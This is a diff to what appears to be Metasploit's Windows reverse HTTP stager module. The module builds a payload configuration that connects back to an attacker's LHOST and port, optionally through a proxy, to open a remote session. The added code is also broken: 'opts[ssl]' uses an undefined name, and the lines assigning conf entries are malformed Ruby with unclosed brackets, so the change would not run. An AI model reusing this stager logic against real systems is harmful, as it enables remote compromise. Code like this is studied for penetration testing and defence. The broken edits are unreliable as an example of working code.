@@ -8,13 +8,11 @@ require 'msf/core/payload/uuid_options'
 
 module Msf
 
-
 ###
 #
 # Complex payload generation for Windows ARCH_X86 that speak HTTP(S)
 #
 ###
-
 
 module Payload::Windows::ReverseHttp
 
@@ -29,8 +27,7 @@ module Payload::Windows::ReverseHttp
   #
   def initialize(*args)
     super
-    register_advanced_options(
-      [
+    register_advanced_options([
         OptInt.new('StagerURILength', [false, 'The URI length for the stager (at least 5 bytes)']),
         OptInt.new('StagerRetryCount', [false, 'The number of times the stager should retry if the first connect fails', 10]),
         OptString.new('PayloadProxyHost', [false, 'An optional proxy server IP address or hostname']),
@@ -44,30 +41,26 @@ module Payload::Windows::ReverseHttp
   #
   # Generate the first stage
   #
-  def generate
-    # Generate the simple version of this stager if we don't have enough space
-    if self.available_space.nil? || required_space > self.available_space
-      return generate_reverse_http(
-        ssl:  false,
-        host: datastore['LHOST'],
-        port: datastore['LPORT'],
-        url:  generate_small_uri,
-        retry_count: datastore['StagerRetryCount'])
-    end
-
+  def generate(opts={})
     conf = {
-      ssl:  false,
-      host: datastore['LHOST'],
-      port: datastore['LPORT'],
-      url:  generate_uri,
-      exitfunk: datastore['EXITFUNC'],
-      proxy_host: datastore['PayloadProxyHost'],
-      proxy_port: datastore['PayloadProxyPort'],
-      proxy_user: datastore['PayloadProxyUser'],
-      proxy_pass: datastore['PayloadProxyPass'],
-      proxy_type: datastore['PayloadProxyType'],
-      retry_count: datastore['StagerRetryCount']
+      :ssl         => opts[ssl] || false,
+      :host        => datastore['LHOST'],
+      :port        => datastore['LPORT'],
+      :url         => generate_small_uri,
+      :retry_count => datastore['StagerRetryCount']
     }
+
+    # Add extra options if we have enough space
+    unless self.available_space.nil? || required_space > self.available_space
+      conf[:url         => generate_uri,
+      conf[:exitfunk    => datastore['EXITFUNC'],
+      conf[:proxy_host  => datastore['PayloadProxyHost'],
+      conf[:proxy_port  => datastore['PayloadProxyPort'],
+      conf[:proxy_user  => datastore['PayloadProxyUser'],
+      conf[:proxy_pass  => datastore['PayloadProxyPass'],
+      conf[:proxy_type  => datastore['PayloadProxyType'],
+      conf[:retry_count => datastore['StagerRetryCount']
+    end
 
     generate_reverse_http(conf)
   end
